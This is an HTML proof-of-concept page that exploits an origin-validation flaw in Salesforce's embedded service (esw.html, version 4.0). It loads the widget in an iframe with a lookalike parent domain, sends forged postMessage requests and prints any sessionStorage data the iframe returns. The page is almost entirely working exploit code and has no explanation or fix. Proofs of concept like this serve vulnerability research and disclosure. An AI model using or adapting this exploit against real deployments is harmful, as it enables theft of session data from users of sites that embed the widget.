<!DOCTYPE html>
<html>
<head>
  <title>Salesforce v4.0 Origin Bypass PoC</title>
  <style>
    body {
      font-family: monospace;
      background: #111;
      color: #0f0;
      padding: 1rem;
    }
    iframe {
      width: 100%;
      height: 400px;
      border: 1px solid #0f0;
    }
    pre {
      background: #222;
      color: #0f0;
      padding: 1em;
      overflow: auto;
    }
  </style>
</head>
<body>
  <h2>[+] Salesforce v4.0 Origin Bypass PoC</h2>
  <p>Check the browser console and below for any leaked <code>sessionStorage</code> content.</p>

  <iframe
    id="sf-frame"
    src="https://service.force.com/embeddedservice/4.0/esw.html?parent=https://reddit.com.wangdubruh.xyz"
  ></iframe>

  <h3>üì¶ sessionStorage Leak:</h3>
  <pre id="output">Waiting for sessionStorage data...</pre>

  <script>
    const iframe = document.getElementById("sf-frame");
    const output = document.getElementById("output");

    iframe.onload = () => {
      console.log("[+] Iframe loaded (Salesforce 4.0)");

      // Send spoofed postMessages after load
      setTimeout(() => {
        const messages = [
          {
            method: "getSessionStorageData",
            domain: "reddit.com.wangdubruh.xyz",
            deploymentId: "test123"
          },
          {
            method: "session.updateStorage",
            domain: "reddit.com.wangdubruh.xyz",
            data: {
              deploymentId: "test123",
              isSamePageNavigation: true,
              isRefresh: false
            }
          }
        ];

        messages.forEach((msg, i) => {
          console.log(`[üì§] Sending message ${i + 1}:`, msg);
          iframe.contentWindow.postMessage(msg, "*");
        });
      }, 1000);
    };

    window.addEventListener("message", (e) => {
      console.log("[üì©] Message from iframe:", e.data);

      if (e.data.method === "sessionStorageData") {
        try {
          const session = JSON.parse(e.data.sessionStorage);
          console.log("üì¶ Leaked sessionStorage from iframe:", session);
          output.textContent = JSON.stringify(session, null, 2);
        } catch (err) {
          console.warn("‚ùå Failed to parse sessionStorage:", err);
          output.textContent = "Error parsing sessionStorage!";
        }
      }
    });
  </script>
</body>
</html>
